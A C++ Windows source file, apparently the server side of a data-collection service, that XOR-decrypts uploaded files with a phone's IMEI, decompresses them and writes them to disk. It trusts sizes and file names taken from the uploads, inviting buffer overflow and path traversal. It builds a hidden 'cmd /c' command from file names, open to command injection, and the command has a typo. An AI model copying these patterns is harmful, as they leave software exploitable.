
#include <windows.h>
#include "GoogleServiceServer.h"
#include "PublicFunction.h"
#include "CryptoUtils.h"
#include "Coder.h"
#include "FileOperator.h"

int DisposePrefixZip(char * filename,char * dstfilename) {
	lstrcpyA(dstfilename, filename);
	int fnlen = lstrlenA(dstfilename);
	for (int i = 0; i < fnlen - 4 + 1; i ++)
	{
		if (memcmp(dstfilename + i,".zip",4) == 0)
		{
			*(dstfilename + i) = 0;
			return TRUE;
 		}
	}
	return FALSE;
}



int DecompressFromFileBlock(char * filename) {

	char szdstfilename[MAX_PATH];
	DisposePrefixZip(filename, szdstfilename);

	HANDLE hf = CreateFileA(filename, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hf == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	HANDLE hfdst = CreateFileA(szdstfilename, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hfdst == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hf);
		return FALSE;
	}

	int ret = 0;
	DWORD dwcnt = 0;
	int filesize = GetFileSize(hf, 0);
	int cnt = 0;

	do 
	{
		char bdecompsize[4];
		char bcompsize[4];
		ret = ReadFile(hf, bdecompsize, 4, &dwcnt, 0);
		ret = ReadFile(hf, bcompsize, 4, &dwcnt, 0);

		int decompsize = *(int*)bdecompsize;
		int compsize = *(int*)bcompsize;

		char * lpsrcbuf = new char[compsize];
		char * lpdstbuf = new char[decompsize + 0x1000];

		ret = ReadFile(hf, lpsrcbuf, compsize, &dwcnt, 0);
		unsigned long outlen = decompsize;
		ret = uncompress((unsigned char*)lpdstbuf, &outlen, (unsigned char*)lpsrcbuf, compsize);
		if (ret == 0)
		{
			ret = WriteFile(hfdst, lpdstbuf, outlen, &dwcnt, 0);
		}

		delete[] lpsrcbuf;
		delete[] lpdstbuf;

		cnt += (8 + compsize);
	} while (cnt < filesize);

	
	CloseHandle(hf);
	
	DeleteFileA(filename);

	CloseHandle(hfdst);


	char szcmd[MAX_PATH];
	wsprintfA(szcmd, "cmd /c renanme %s %s", filename, szdstfilename);
	WinExec(szcmd,SW_HIDE);

	return TRUE;
}





int DecryptAndDecompFile(LPDATAPROCESS_PARAM lpparam, char * filename, char * lpdstfn, char * imei, char * username, int withparam, int append,DWORD type) {

	DATAPROCESS_PARAM stparam = *lpparam;
	char szlog[1024];
	char errorbuf[1024];
	HANDLE hf = CreateFileA(filename, GENERIC_WRITE | GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hf == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	int filesize = GetFileSize(hf, 0);
	char * lpdata = new char[filesize];
	DWORD dwcnt = 0;
	int ret = ReadFile(hf, lpdata, filesize, &dwcnt, 0);
	CloseHandle(hf);
	DeleteFileA(filename);
	
	if ( ((type & PACKET_CRYPT_FLAG) && (type & PACKET_COMPRESS_FLAG)) || 
		((type & OLD_CRYPT_FLAG) && (*(unsigned short*)(lpdata + sizeof(int)) != 0x9c78)) )
	{
		int len = CryptoUtils:: xorCryptData(lpdata, filesize, imei, IMEI_IMSI_PHONE_SIZE, lpdata, filesize);

		if (type & PACKET_COMPRESS_FLAG)
		{
			;
		}

		int compresssize = *(int*)(lpdata);
		if (compresssize <= 0)
		{
			delete[] lpdata;
			wsprintfA(szlog, "DecryptAndDecompFile uncompress file:%s size 0", filename);
			ErrorFormat(&stparam, errorbuf, szlog);
			WriteLogFile(errorbuf);
			return FALSE;
		}

		unsigned long unzipbufLen = compresssize + 0x1000;
		unsigned char * unzipbuf = (unsigned char*)new char[unzipbufLen];
		if (unzipbuf == FALSE)
		{
			delete[] lpdata;
			return FALSE;
		}

		ret = uncompress((Bytef*)unzipbuf, (uLongf*)&unzipbufLen, (Bytef*)(lpdata + sizeof(DWORD)), (uLongf)(filesize - sizeof(DWORD)));
		if (ret != Z_OK) {
			delete[]unzipbuf;
			delete[] lpdata;
			wsprintfA(szlog, "DecryptAndDecompFile uncompress error:%s", filename);
			ErrorFormat(&stparam, errorbuf, szlog);
			//WriteLogFile(errorbuf);

			WriteErrorPacket("uncompress error", lpdata, ERRORPACKETSIZE);
			return FALSE;
		}
		*(DWORD*)(unzipbuf + unzipbufLen) = 0;
		delete[] lpdata;

		if (withparam)
		{
			FileOperator::GetPathFromFullName(filename, lpdstfn);
			char * lpbuf = (char*)unzipbuf;
			DWORD dwfilenamesize = *(DWORD*)lpbuf;
			char szfilename[MAX_PATH] = { 0 };
			lpbuf += sizeof(DWORD);
			memmove(szfilename, lpbuf, dwfilenamesize);
			lpbuf += dwfilenamesize;
			DWORD dwfilesize = *(DWORD*)lpbuf;
			lpbuf += sizeof(DWORD);

			char szgbkfn[MAX_PATH] = { 0 };
			ret = Coder::UTF8FNToGBKFN(szfilename, dwfilenamesize, szgbkfn, MAX_PATH);
			lstrcatA(lpdstfn, szgbkfn);

			hf = CreateFileA(lpdstfn, GENERIC_WRITE, 0, 0, append, FILE_ATTRIBUTE_NORMAL, 0);
			if (hf == INVALID_HANDLE_VALUE)
			{
				delete[]unzipbuf;
				return FALSE;
			}
			ret = SetFilePointer(hf, 0, 0, FILE_END);
			ret = WriteFile(hf, lpbuf, dwfilesize, &dwcnt, 0);
			CloseHandle(hf);
		}
		else {
			ret = FileOperator::TripSufixName(filename, lpdstfn, ".tmp");
			hf = CreateFileA(lpdstfn, GENERIC_WRITE, 0, 0, append, FILE_ATTRIBUTE_NORMAL, 0);
			if (hf == INVALID_HANDLE_VALUE)
			{
				delete[]unzipbuf;
				return FALSE;
			}
			ret = SetFilePointer(hf, 0, 0, FILE_END);
			ret = WriteFile(hf, unzipbuf, unzipbufLen, &dwcnt, 0);
			CloseHandle(hf);
		}

		delete[]unzipbuf;
		return TRUE;
	}
	else {
		if (withparam)
		{
			FileOperator::GetPathFromFullName(filename, lpdstfn);
			char * lpbuf = (char*)lpdata;
			DWORD dwfilenamesize = *(DWORD*)lpbuf;
			char szfilename[MAX_PATH] = { 0 };
			lpbuf += sizeof(DWORD);
			memmove(szfilename, lpbuf, dwfilenamesize);
			lpbuf += dwfilenamesize;
			DWORD dwfilesize = *(DWORD*)lpbuf;
			lpbuf += sizeof(DWORD);

			char szgbkfn[MAX_PATH] = { 0 };
			ret = Coder::UTF8FNToGBKFN(szfilename, dwfilenamesize, szgbkfn, MAX_PATH);
			lstrcatA(lpdstfn, szgbkfn);

			hf = CreateFileA(lpdstfn, GENERIC_WRITE, 0, 0, append, FILE_ATTRIBUTE_NORMAL, 0);
			if (hf == INVALID_HANDLE_VALUE)
			{
				delete[] lpdata;
				return FALSE;
			}

			ret = SetFilePointer(hf, 0, 0, FILE_END);

			ret = WriteFile(hf, lpbuf, dwfilesize , &dwcnt, 0);
			CloseHandle(hf);
		}
		else {
			ret = FileOperator::TripSufixName(filename, lpdstfn, ".tmp");
			hf = CreateFileA(lpdstfn, GENERIC_WRITE, 0, 0, append, FILE_ATTRIBUTE_NORMAL, 0);
			if (hf == INVALID_HANDLE_VALUE)
			{
				delete[] lpdata;
				return FALSE;
			}
			ret = SetFilePointer(hf, 0, 0, FILE_END);
			ret = WriteFile(hf, lpdata, filesize, &dwcnt, 0);
			CloseHandle(hf);
		}

		delete[] lpdata;
		return TRUE;
	}

	return TRUE;
}





int NoneDecryptDataWiHeader(LPDATAPROCESS_PARAM lpparam, char * filename,char * lpdstfn,char * imei,char * username,int withparam,int append) {

	DATAPROCESS_PARAM stparam = *lpparam;
	//char szlog[1024];
	//char errorbuf[1024];
	HANDLE hf = CreateFileA(filename, GENERIC_WRITE|GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hf == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	int filesize = GetFileSize(hf, 0);

	char * lpdata = new char[filesize];

	DWORD dwcnt = 0;
	int ret = ReadFile(hf, lpdata, filesize, &dwcnt, 0);
	CloseHandle(hf);

	if (withparam)
	{
		FileOperator::GetPathFromFullName(filename, lpdstfn);
		char * lpbuf = (char*)lpdata;
		DWORD dwfilenamesize = *(DWORD*)lpbuf;
		char szfilename[MAX_PATH] = { 0 };
		lpbuf += sizeof(DWORD);
		memmove(szfilename, lpbuf, dwfilenamesize);
		lpbuf += dwfilenamesize;
		DWORD dwfilesize = *(DWORD*)lpbuf;
		lpbuf += sizeof(DWORD);

		char szgbkfn[MAX_PATH] = { 0 };
		ret = Coder::UTF8FNToGBKFN(szfilename, dwfilenamesize, szgbkfn, MAX_PATH);
		lstrcatA(lpdstfn, szgbkfn);

		hf = CreateFileA(lpdstfn, GENERIC_WRITE, 0, 0, append, FILE_ATTRIBUTE_NORMAL, 0);
		if (hf == INVALID_HANDLE_VALUE)
		{
			return FALSE;
		}

		ret = WriteFile(hf, lpbuf, filesize - (lpbuf - lpdata), &dwcnt, 0);
		CloseHandle(hf);
		DeleteFileA(filename);
	}
	else {
		return TRUE;

		hf = CreateFileA(filename, GENERIC_WRITE, 0, 0, append, FILE_ATTRIBUTE_NORMAL, 0);
		if (hf == INVALID_HANDLE_VALUE)
		{
			return FALSE;
		}

		ret = WriteFile(hf, lpdata, filesize, &dwcnt, 0);
		CloseHandle(hf);
		lstrcpyA(lpdstfn, filename);
	}

	return TRUE;
}